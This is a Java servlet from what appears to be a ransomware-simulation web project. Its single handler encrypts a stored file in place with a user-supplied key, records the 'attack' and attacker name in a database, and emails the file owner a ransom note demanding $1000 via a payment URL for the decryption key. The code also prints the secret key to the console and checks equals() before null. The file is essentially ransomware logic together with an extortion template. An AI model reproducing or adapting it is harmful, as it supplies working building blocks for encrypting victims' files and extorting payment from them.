/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.rnswall.actions;

import com.rnswall.crypto.CryptoUtils;
import com.rnswall.db.DBConnection;
import com.rnswall.utility.RansomeUserDAOS;
import com.rnswall.utility.SendingMails;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.PreparedStatement;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/**
 *
 * @author Ramu Maloth
 */
public class RansomAttakingTwo extends HttpServlet {

    
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        
        PrintWriter out = response.getWriter();
        String id = request.getParameter("id");
       String ransomeFileName = request.getParameter("ransomeFileName");
       String fileType = request.getParameter("fileType");
       String username = request.getParameter("username");
       String email    = request.getParameter("email");
       String fileextension = request.getParameter("fileextension");
       String secretkey  = request.getParameter("secretkey");
        System.out.println("Secret Key "+secretkey);
       File directory = new File(getServletContext().getRealPath("/cipherfiles"));
       if(secretkey.equals("")|| secretkey==null){
       response.sendRedirect("RansomAttackingOne.jsp?id="+id+"&msg=notnull&fileid="+ransomeFileName+"&filetypes="+fileType+"&custname="+username+"&email="+email+"&fileextension="+fileextension);
       }else{
        String filePath = directory.getAbsolutePath() + "\\" + ransomeFileName;
        File inputFile = new File(filePath);
        out.println("File Path "+filePath);
        String paymenturl = "https://payments.billdesk.com/bdpg/wpages/";
        
        Connection con = null;
        PreparedStatement ps = null;
        HttpSession hs = request.getSession();
        String attackerName = hs.getAttribute("rnsname").toString();
        java.sql.Date cDate = new java.sql.Date(new java.util.Date().getTime());
        try {            
            con = DBConnection.getDBConnection();
            String attackingSQL = "insert into ransomeattacking(ransomeFileName,fid,filetype,username,email,fileextension,secretkey,paymneturl,paymentstatus,recoverystatus,attackername,cdate) values(?,?,?,?,?,?,?,?,?,?,?,?)";
            ps = con.prepareStatement(attackingSQL);
            ps.setString(1, ransomeFileName);
            ps.setInt(2, Integer.parseInt(id));
            ps.setString(3, fileType);
            ps.setString(4, username);
            ps.setString(5, email);
            ps.setString(6, fileextension);
            ps.setString(7, secretkey);
            ps.setString(8, paymenturl);
            ps.setString(9, "No");
            ps.setString(10, "No");
            ps.setString(11, attackerName);
            ps.setDate(12, cDate);
            int no = ps.executeUpdate();
            if(no > 0){
            CryptoUtils.encrypt(secretkey, inputFile, inputFile); // Original Attacking happens Here
            RansomeUserDAOS.setAttackStatus(Integer.parseInt(id));
            String subject  = "Your File Attacked ";
            String body = "Dear User "+username+" Your File "+ransomeFileName+ " has been attacked. please pay $1000 through this url and get decrypt key "+paymenturl;
            System.out.println("Mail Message "+body);
            SendingMails.sendMail(body, subject, email, email);
            response.sendRedirect("RansomeUserFileViews.jsp");
            }else{
             response.sendRedirect("RansomeUserFileViews.jsp");
            }
            
           
        } catch (Exception e) {
            e.printStackTrace();
        }finally{
            try {
                ps.close();
                con.close();
            } catch (Exception e) {
            }
        }
       
       }
    }

    
}
